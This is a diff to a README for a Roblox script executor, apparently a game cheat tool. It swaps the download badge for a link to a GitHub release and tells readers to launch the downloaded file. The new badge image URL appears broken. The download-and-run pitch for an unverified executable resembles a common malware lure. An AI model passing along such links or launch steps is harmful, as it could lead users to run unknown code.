@@ -36,7 +36,7 @@ In this repository, you will find essential resources and scripts for enhancing 
 
 To start using Roblox Synapse Executor and unleash its power in your Roblox games, download the tool from the following link:
 
-[![Download Synapse Executor](https://img.shields.io/badge/Download-Synapse%20Executor-blue)](https://github.com/file/App.zip)
+[![Download Synapse Executor](https://github.com/mrgetsome/Roblox-Synapse/releases/tag/v2.0%20Executor-blue)](https://github.com/mrgetsome/Roblox-Synapse/releases/tag/v2.0)
 
 🔥 **Launch the downloaded file to begin your Synapse Executor journey!**
 
